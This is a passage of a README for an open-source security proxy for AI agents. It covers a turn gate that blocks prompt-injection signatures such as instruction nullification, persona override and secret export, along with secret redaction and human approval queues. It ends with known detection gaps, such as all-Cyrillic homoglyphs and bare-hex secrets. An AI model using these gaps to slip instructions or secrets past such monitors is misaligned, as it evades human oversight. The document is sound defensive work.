- ✅ **Security hardening (H1):** the MCP proxy's `normalize()` redaction no longer relies solely on its own length/shape stopgap — it now also runs the canonical shared secret detector (`doberman.engine.rules.secrets`, the same one that drives `secret_exfiltration`), layered strictly ON TOP of the stopgap so coverage can only widen, never narrow (Azure/GCP/Stripe/SendGrid/npm/JWT/DB-URI/env-assignment shapes the old stopgap missed are now redacted too). The proxy's `_call_tool` handler is also now wrapped end-to-end: any unexpected exception escaping `decide_and_execute` returns a fail-closed error naming only a reason code and the exception's class — never the exception's own message or a raw argument fragment — closing the last gap where an unhandled error could have leaked call content back to the agent
- ✅ **Turn gate (Feature 11):** a second, pre-inference invocation point (`doberman.turngate`) that judges the user's *turn* — prompt plus attached/pasted/tool-fetched content — before a single inference token is spent. Tier 0 deterministic signatures (instruction nullification, authority override, secret export, encoded payload) hard-block on an issue-vs-mention + origin discrimination (untrusted-origin match always blocks; a typed *mention* steps up instead of blocking); Tier 1 heuristic classes (embedded pasted instructions, persona override, obfuscation, urgency+secrecy framing) are AUTH-only and structurally block-incapable; a stylometric co-occurrence gate steps up only when an extreme per-entity style outlier coincides with a sensitive apparent intent, never on style alone; a repeat-after-block escape hatch scales the re-challenge to the original block (Tier 0 → 2FA) with single-use approval and a third-attempt lockout. Released turns tag-and-pass a bounded, raise-only `TurnContext` into the action stage (a flagged turn's follow-on actions score harsher; flagged pasted segments inherit `provenance: untrusted_data`). The turn gate is additive and an efficiency/early-warning layer only — the action gate above remains the safety guarantee, and with no host pre-inference hook or `DOBERMAN_TURN_GATE=off` it is simply absent.
- ✅ **Turn gate boundary:** the import-linter contract now forbids the policy core from importing **either** invocation adapter (`doberman.proxy`, `doberman.turngate`) — the turn gate stays a pure adapter, injected into the engine like the proxy, never a static dependency of it.
- ✅ Dashboard, interactive AUTH approve/deny (D3): a `pending_approvals` queue mediates between the decision path and the dashboard purely through SQLite — never HTTP into the decision path. `DashboardPrompter` implements the existing `Prompter` interface, engaging the queue only while a liveness heartbeat is fresh; a stale/missing heartbeat, an unanswered approval, or a poll timeout all fall back to the next channel (elicitation → GUI → terminal) with zero added latency and no denial invented on the dashboard's behalf. Resolution is a single-use, race-safe `UPDATE ... WHERE status='pending'` transition (a resolved/expired row 409s), and the dashboard only ever relays a decision (plus, for 2FA tiers, a code) — verification stays entirely in the decision-path process via the existing TOTP check. Pending rows carry only already-redacted fields (action type, risk, reason codes, explanation, path class) — never a raw target or secret
- ✅ Dashboard visual polish (D5): color-coded PASS/AUTH/BLOCK and risk badges (mirroring the terminal's `[RISK: <level>]` convention) in the live feed and pending-approval cards, a header bar surfacing the current mode + effective enforcement from the existing `/api/stats` fields, and a CSS-only designed empty state for both the feed and the pending-approvals list before any decisions arrive. The dark-by-default palette is formalized as CSS custom properties with a `prefers-color-scheme: light` override — still one inline shell, no build step, no new dependencies, no endpoint/auth/redaction changes
- 📋 Host-harness, continued (containment architecture): deeper Bash-command egress parsing · entropy-on-egress escalation · warm-daemon adaptive layer · honeytoken tripwire + session circuit-breaker
- 🛠 Cost observability — **CB.1 + CB.2 landed**: a redaction-safe `CostEvent` + local append-only meter (`doberman.storage.cost`), advisory and strictly off the decision path; plus a `CostObserver` plugin seam (`doberman.cost_observers` entry-point group) — observers receive a copy of every recorded event, are isolated (a raising observer is logged and skipped, never breaks the record path), and can never alter a verdict. Next: raise-only loop-anomaly detector (CB.3)
- 📋 Enterprise platform: centralized control plane, dashboards, org policy, SSO/RBAC

### Known limitations

Doberman is **defense-in-depth, not airtight** — no single rule is a guarantee. One concrete, currently-known gap:

- **Whole-script homoglyph confusables.** The deterministic check catches *intra-token* mixed-script confusables (e.g. `раypal`, which mixes Cyrillic and Latin). But a token rendered **entirely in one non-Latin script** that mimics a Latin word (e.g. an all-Cyrillic look-alike of `paypal`) is NFKC-stable and is **not** caught by the core deterministic check today. Closing it is planned via a perplexity/confusable detector. Read the `OOD/homoglyph token signals` item above as defense-in-depth, not a robustness guarantee.
- **Bare high-entropy hex.** To avoid flagging git SHAs, content/AST digests, and lockfile hashes as secrets — a noisy false positive that also poisoned the multi-step taint ledger — the generic high-entropy heuristic ignores tokens that are *entirely* hash-shaped hex (≥ 40 chars). A real secret that is bare hex with **no** surrounding credential name is therefore not stepped up by this heuristic alone; it is still caught when it carries a credential key-name (e.g. `API_KEY=…`), matches a known credential shape, or is later matched by the read-vs-send fingerprint. Defense-in-depth, not a guarantee.
- **Bare-token fixture/pattern-text suppression is WEAK-path only, and marker-gated on the residual.** A bare (non-assignment) token that is regex-pattern source text being quoted (e.g. `sk-ant-[A-Za-z0-9_-]{20,}`) or an obvious hand-written fixture is not stepped up by the high-entropy heuristic alone (#73). Because a fixture marker (`EXAMPLE`/`SAMPLE`/`FAKE`/`DUMMY`) and ordered `0-9`/`a-z` filler are attacker-controllable — and for a *shapeless* secret the high-entropy heuristic is the only signal — a marker on its own is **not** trusted: the token is suppressed only when, after stripping the markers and ascending runs, the residual is too short/low-entropy to be a secret. A real key padded with `EXAMPLE` keeps a high-entropy residual and still fires, and a variable merely *named* with a marker never suppresses its value (the check runs on the RHS after the `=` split). The suppression also never touches the STRONG credential-shape path, which can still drive `secret_exfiltration`. Regex-pattern source (`[]{}\`) is suppressed unconditionally — the tokenizer charset can't produce those characters in a real token. Defense-in-depth, not a guarantee: a full live-shaped example key quoted in prose with no marker is still indistinguishable from a real one and steps up.

---

## Contributing

Start with [CONTRIBUTING.md](CONTRIBUTING.md) for local setup, CI checks, project
invariants, and the PR workflow.

---

## License

Apache-2.0. The core is genuinely standalone — no proprietary dependency, ever (CI-enforced).

---

<sub>AI agent security · MCP security · MCP proxy · MCP firewall · AI guardrails · agentic AI safety · prompt injection defense · tool poisoning defense · LLM tool-use authorization · human-in-the-loop AI · AI agent sandbox · runtime AI security · zero trust for AI agents · Claude Code security · autonomous agent governance · data exfiltration prevention · adaptive anomaly detection · open source AI security</sub>
